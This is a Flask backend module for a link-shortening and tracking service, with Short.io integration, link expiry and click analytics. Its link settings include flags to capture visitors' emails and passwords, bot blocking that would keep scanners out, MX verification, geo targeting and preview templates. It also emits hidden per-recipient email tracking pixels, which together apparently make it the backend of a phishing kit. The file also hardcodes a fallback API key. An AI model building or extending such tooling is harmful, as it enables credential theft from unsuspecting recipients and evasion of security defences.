
from flask import Blueprint, request, jsonify, session
from src.models.user import db, User
from src.models.link import Link
from src.models.tracking_event import TrackingEvent
import string
import random
import json
from dateutil.relativedelta import relativedelta
import requests
import os

links_bp = Blueprint("links", __name__)

def require_auth():
    if "user_id" not in session:
        return None
    return User.query.get(session["user_id"])

def generate_short_code(length=8):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def sanitize_input(text):
    if not text:
        return ""
    return text.strip()

@links_bp.route("/links/create", methods=["POST", "OPTIONS"])
def create_link():
    # Handle CORS preflight
    if request.method == "OPTIONS":
        return jsonify({"success": True}), 200
    user = require_auth()
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    
    try:
        data = request.get_json()
        
        # Validate required fields
        if not data.get("originalUrl"):
            return jsonify({"error": "Original URL is required"}), 400
        
        original_url = sanitize_input(data.get("originalUrl"))
        title = sanitize_input(data.get("title", ""))
        campaign = sanitize_input(data.get("campaign", ""))
        # Add a new variable for campaign_name to align with the Link model
        campaign_name = campaign if campaign else title if title else "Untitled Campaign"
        description = sanitize_input(data.get("description", ""))
        password = sanitize_input(data.get("password", ""))
        domain_type = data.get("domain", "vercel")
        custom_domain = sanitize_input(data.get("customDomain", ""))
        expiry_duration_str = data.get("expiryDate") # This is actually expiryDuration from frontend
        expiry_date = None
        if expiry_duration_str:
            from datetime import datetime, timedelta
            from dateutil.relativedelta import relativedelta
            now = datetime.utcnow()
            parts = expiry_duration_str.split(" ")
            if len(parts) == 2:
                value = int(parts[0])
                unit = parts[1].lower()
                if "hour" in unit:
                    expiry_date = now + timedelta(hours=value)
                elif "day" in unit:
                    expiry_date = now + timedelta(days=value)
                elif "week" in unit:
                    expiry_date = now + timedelta(weeks=value)
                elif "month" in unit:
                    expiry_date = now + relativedelta(months=value)
                elif "year" in unit:
                    expiry_date = now + relativedelta(years=value)

        short_url = ""
        if domain_type == "vercel":
            # Generate short code for Vercel domain
            short_code = generate_short_code()
            while Link.query.filter_by(short_code=short_code).first():
                short_code = generate_short_code()
            scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
            base_url = f"{scheme}://{request.host}"
            short_url = f"{base_url}/s/{short_code}"
        elif domain_type == "shortio":
            # Use Short.io API to create a short link
            shortio_api_key = os.environ.get("SHORTIO_API_KEY", "sk_DbGGlUHPN7Z9VotL")
            if not shortio_api_key:
                return jsonify({"success": False, "error": "Short.io API key not configured"}), 500
            
            shortio_domain = os.environ.get("SHORTIO_DOMAIN", "secure-links.short.gy")
            if not shortio_domain:
                return jsonify({"success": False, "error": "Short.io domain not configured"}), 500

            headers = {
                "Authorization": shortio_api_key,
                "Content-Type": "application/json"
            }
            payload = {
                "originalURL": original_url,
                "domain": shortio_domain
            }
            
            response = requests.post("https://api.short.io/links", headers=headers, json=payload)
            response.raise_for_status() # Raise an exception for HTTP errors
            
            short_link_data = response.json()
            short_url = short_link_data.get("shortURL")
            short_code = short_link_data.get("path") # Short.io returns path as short code
            
            if not short_url:
                return jsonify({"success": False, "error": "Failed to get short URL from Short.io"}), 500
        elif domain_type == "custom" and custom_domain:
            # Generate short code for custom domain
            short_code = generate_short_code()
            while Link.query.filter_by(short_code=short_code).first():
                short_code = generate_short_code()
            short_url = f"https://{custom_domain}/{short_code}"
        else:
            return jsonify({"success": False, "error": "Invalid domain type or custom domain not provided"}), 400

        # Create new link
        new_link = Link(
            user_id=user.id,
            target_url=original_url,
            short_code=short_code,
            campaign_name=campaign_name,
            description=description,
            password=password
        )
        
        # Set expiry date if provided
        if expiry_date:
            new_link.expiry_date = expiry_date
        
        db.session.add(new_link)
        db.session.commit()
        
        # Return the created link
        link_data = new_link.to_dict(base_url=request.host_url) # Use request.host_url for base_url
        link_data.update({
            "shortUrl": short_url,
            "total_clicks": 0,
            "real_visitors": 0,
            "blocked_attempts": 0
        })
        
        return jsonify({
            "success": True,
            "link": link_data
        })
        
    except requests.exceptions.RequestException as e:
        db.session.rollback()
        print(f"Error creating link with Short.io: {e}")
        return jsonify({"error": f"Failed to create link with Short.io: {e}"}), 500
    except Exception as e:
        db.session.rollback()
        import traceback
        print(f"Error creating link: {e}")
        traceback.print_exc()
        return jsonify({"success": False, "error": f"Failed to create link: {str(e)}"}), 500
@links_bp.route("/links", methods=["GET", "POST", "PUT", "DELETE"])
def links():
    user = require_auth()
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    
    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
    base_url = f"{scheme}://{request.host}"
    
    if request.method == "GET":
        # Get all links for the current user
        links = Link.query.filter_by(user_id=user.id).order_by(Link.created_at.desc()).all()
        
        links_data = []
        for link in links:
            link_dict = link.to_dict(base_url=base_url)
            # Get analytics data
            total_clicks = TrackingEvent.query.filter_by(link_id=link.id).count()
            real_visitors = TrackingEvent.query.filter_by(link_id=link.id, is_bot=False).count()
            blocked_attempts = TrackingEvent.query.filter_by(link_id=link.id, status="blocked").count()

            link_dict.update({
                "total_clicks": total_clicks,
                "real_visitors": real_visitors,
                "blocked_attempts": blocked_attempts
            })
            
            # Add tracking URLs with ID parameters
            link_dict["tracking_url"] = f"{base_url}/t/{link.short_code}?id={{id}}"
            link_dict["pixel_url"] = f"{base_url}/p/{link.short_code}?email={{email}}&id={{id}}"
            link_dict["email_code"] = f'<img src="{base_url}/p/{link.short_code}?email={{email}}&id={{id}}" width="1" height="1" style="display:none;" />'
            links_data.append(link_dict)
        
        return jsonify({"links": links_data})
    
    elif request.method == "POST":
        # Create a new tracking link
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "No data provided"}), 400
        
        target_url = sanitize_input(data.get("target_url", ""))
        campaign_name = sanitize_input(data.get("campaign_name", "Untitled Campaign"))
        description = sanitize_input(data.get("description", ""))
        password = sanitize_input(data.get("password", ""))
        preview_template_url = sanitize_input(data.get("preview_template_url", ""))
        
        # Security features
        capture_email = data.get("capture_email", False)
        capture_password = data.get("capture_password", False)
        bot_blocking_enabled = data.get("bot_blocking_enabled", True)
        rate_limiting_enabled = data.get("rate_limiting_enabled", False)
        dynamic_signature_enabled = data.get("dynamic_signature_enabled", False)
        mx_verification_enabled = data.get("mx_verification_enabled", False)
        
        # Geo targeting
        geo_targeting_enabled = data.get("geo_targeting_enabled", False)
        geo_targeting_type = data.get("geo_targeting_type", "allow")  # allow or block
        allowed_countries = data.get("allowed_countries", [])
        blocked_countries = data.get("blocked_countries", [])
        allowed_regions = data.get("allowed_regions", [])
        blocked_regions = data.get("blocked_regions", [])
        allowed_cities = data.get("allowed_cities", [])
        blocked_cities = data.get("blocked_cities", [])
        
        if not target_url:
            return jsonify({"success": False, "error": "Target URL is required"}), 400
        
        if not target_url.startswith(("http://", "https://")):
            return jsonify({"success": False, "error": "Invalid target URL"}), 400
        
        # Generate unique short code
        while True:
            short_code = generate_short_code()
            existing = Link.query.filter_by(short_code=short_code).first()
            if not existing:
                break
        
        try:
            link = Link(
                user_id=user.id,
                short_code=short_code,
                target_url=target_url,
                campaign_name=campaign_name,
                description=description,
                password=password,
                preview_template_url=preview_template_url,
                capture_email=capture_email,
                capture_password=capture_password,
                bot_blocking_enabled=bot_blocking_enabled,
                rate_limiting_enabled=rate_limiting_enabled,
                dynamic_signature_enabled=dynamic_signature_enabled,
                mx_verification_enabled=mx_verification_enabled,
                geo_targeting_enabled=geo_targeting_enabled,
                geo_targeting_type=geo_targeting_type,
                allowed_countries=json.dumps(allowed_countries),
                blocked_countries=json.dumps(blocked_countries),
                allowed_regions=json.dumps(allowed_regions),
                blocked_regions=json.dumps(blocked_regions),
                allowed_cities=json.dumps(allowed_cities),
                blocked_cities=json.dumps(blocked_cities)
            )
            db.session.add(link)
            db.session.commit()
            
            link_data = link.to_dict(base_url=base_url)
            link_data["short_url"] = f"{base_url}/s/{link.short_code}"
            
            return jsonify({"success": True, "link": link_data})
        
        except Exception as e:
            db.session.rollback()
            import traceback
            print(f"Error creating link: {e}")
            traceback.print_exc()
            return jsonify({"success": False, "error": f"Failed to create link: {str(e)}"}), 500

    elif request.method == "PUT":
        # Update a tracking link
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "No data provided"}), 400
        
        link_id = data.get("id")
        if not link_id:
            return jsonify({"success": False, "error": "Link ID is required"}), 400
        
        link = Link.query.get(link_id)
        if not link or link.user_id != user.id:
            return jsonify({"success": False, "error": "Link not found or not authorized"}), 404
        
        # Update fields
        link.target_url = sanitize_input(data.get("target_url", link.target_url))
        link.campaign_name = sanitize_input(data.get("campaign_name", link.campaign_name))
        link.description = sanitize_input(data.get("description", link.description))
        link.password = sanitize_input(data.get("password", link.password))
        link.preview_template_url = sanitize_input(data.get("preview_template_url", link.preview_template_url))
        
        # Update security features
        link.capture_email = data.get("capture_email", link.capture_email)
        link.capture_password = data.get("capture_password", link.capture_password)
        link.bot_blocking_enabled = data.get("bot_blocking_enabled", link.bot_blocking_enabled)
        link.rate_limiting_enabled = data.get("rate_limiting_enabled", link.rate_limiting_enabled)
        link.dynamic_signature_enabled = data.get("dynamic_signature_enabled", link.dynamic_signature_enabled)
        link.mx_verification_enabled = data.get("mx_verification_enabled", link.mx_verification_enabled)
        
        # Update geo targeting
        link.geo_targeting_enabled = data.get("geo_targeting_enabled", link.geo_targeting_enabled)
        link.geo_targeting_type = data.get("geo_targeting_type", link.geo_targeting_type)
        link.allowed_countries = data.get("allowed_countries", link.allowed_countries)
        link.blocked_countries = data.get("blocked_countries", link.blocked_countries)
        link.allowed_regions = data.get("allowed_regions", link.allowed_regions)
        link.blocked_regions = data.get("blocked_regions", link.blocked_regions)
        link.allowed_cities = data.get("allowed_cities", link.allowed_cities)
        link.blocked_cities = data.get("blocked_cities", link.blocked_cities)
        
        try:
            db.session.commit()
            return jsonify({"success": True, "link": link.to_dict(base_url=base_url)})
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "error": f"Failed to update link: {str(e)}"}), 500

    elif request.method == "DELETE":
        # Delete a tracking link
        link_id = request.args.get("id")
        if not link_id:
            return jsonify({"success": False, "error": "Link ID is required"}), 400
        
        link = Link.query.get(link_id)
        if not link or link.user_id != user.id:
            return jsonify({"success": False, "error": "Link not found or not authorized"}), 404
        
        try:
            db.session.delete(link)
            db.session.commit()
            return jsonify({"success": True})
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "error": f"Failed to delete link: {str(e)}"}), 500

    return jsonify({"success": False, "error": "Invalid request method"}), 405

